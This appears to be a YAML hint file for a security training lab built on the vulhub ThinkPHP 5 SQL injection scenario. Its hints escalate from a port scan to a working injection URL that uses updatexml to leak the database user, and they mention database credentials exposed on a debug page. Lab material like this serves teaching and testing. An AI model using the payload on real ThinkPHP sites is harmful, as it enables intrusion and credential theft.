schema_version: 1
match: thinkphp/in-sqlinjection
hint_levels:
  low:
  - Inspect the thinkphp service or application on {{NODE_NAME}} @ {{NODE_IP}}.
  medium:
  - |-
    Catalog TCP ports: 80. Identify the exposed services:

    ```bash
    nmap -Pn -sT -sV -p 80 {{NODE_IP}}
    ```
  - 'Catalog port mappings (published → container): web: 80/tcp → container 80/tcp. These are recipe defaults; use
    the deployed service port if the scenario remaps it.'
  - 'Documented target URL(s): `http://{{NODE_IP}}/index.php`.'
  high:
  - 'Vulnerability: ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability.'
  - |-
    Exploit

    Open the page `http://{{NODE_IP}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1`，you will find messages revealed successfully：

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/in-sqlinjection/01.png

    And you can find the account and password of the database through the debug page.

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/in-sqlinjection/02.png

    This is another sensitive information disclosure vulnerability.
